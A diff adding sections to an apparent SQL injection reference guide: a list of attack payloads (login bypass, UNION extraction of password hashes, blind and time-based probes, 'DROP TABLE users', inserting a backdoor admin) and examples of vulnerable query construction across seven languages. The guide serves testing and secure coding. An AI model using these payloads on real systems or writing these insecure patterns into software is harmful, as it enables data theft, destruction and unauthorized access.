@@ -30,6 +30,118 @@ The unsafe assumption is that user input is always benign data. Denylisting char
 | **Weak controls** | Escaping quotes only, denylist of `'`, `;`, `--`, `#` without parameter binding |
 | **Second-order paths** | Values stored earlier and later embedded in queries without parameterization |
 
+## Attack Payloads
+
+Use these in authorized tests against login, search, and filter parameters. Syntax varies by database engine—confirm the backend before relying on a single payload.
+
+### Pattern 1: Authentication bypass (string context)
+
+```sql
+' OR '1'='1
+' OR '1'='1'--
+admin'--
+' OR 1=1--
+```
+
+### Pattern 2: Comment termination
+
+```sql
+'; DROP TABLE users;--
+value' /* comment */ OR '1'='1
+# MySQL comment
+```
+
+### Pattern 3: UNION-based extraction
+
+```sql
+' UNION SELECT username, password_hash FROM users--
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+```
+
+### Pattern 4: Boolean-based blind
+
+```sql
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(password,1,1)='a'--
+```
+
+### Pattern 5: Time-based blind
+
+```sql
+'; SELECT pg_sleep(5);--
+' OR IF(1=1,SLEEP(5),0)--
+```
+
+### Pattern 6: Stacked queries (when supported)
+
+```sql
+'; INSERT INTO admins VALUES ('backdoor','hash');--
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```python
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+cursor.execute("SELECT * FROM t WHERE name = '%s'" % name)
+db.engine.execute("SELECT ... " + filter_val)
+Model.objects.raw(f"SELECT ... {sort}")
+session.execute(text(f"SELECT ... {col}"))  # SQLAlchemy — bind params instead
+```
+
+ORM escape hatches: `.extra(where=...)`, `RawSQL`, `connection.cursor().execute(string)`.
+
+### Java
+
+```java
+stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");
+PreparedStatement ps = conn.prepareStatement("SELECT * FROM t ORDER BY " + sortColumn);
+entityManager.createNativeQuery("... " + userFilter);
+```
+
+MyBatis: `${name}` in XML mappers (unsafe interpolation) vs `#{name}` (bound).
+
+### C#
+
+```csharp
+cmd.CommandText = $"SELECT * FROM Users WHERE Name = '{name}'";
+context.Database.ExecuteSqlRaw($"DELETE FROM Logs WHERE id = {id}");
+FromSqlRaw($"SELECT * FROM Products WHERE {userFilter}");
+```
+
+Dapper: only safe when SQL uses `@param` with object properties—not string-built SQL.
+
+### JavaScript
+
+```javascript
+db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
+connection.query("SELECT * FROM t WHERE name = '" + name + "'");
+knex.raw(`SELECT * FROM users WHERE ${userClause}`);
+```
+
+### Go
+
+```go
+db.Query(fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name))
+db.Exec("DELETE FROM items WHERE id = " + id)
+```
+
+### SQL (dynamic fragments in migrations, reports, BI tools)
+
+```sql
+EXEC('SELECT * FROM users WHERE role = ''' + @role + '''');
+ORDER BY @userSortColumn;  -- identifier injection if not allowlisted
+```
+
+### C
+
+```c
+sprintf(query, "SELECT * FROM users WHERE id = %s", user_id);
+sqlite3_exec(db, query, ...);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
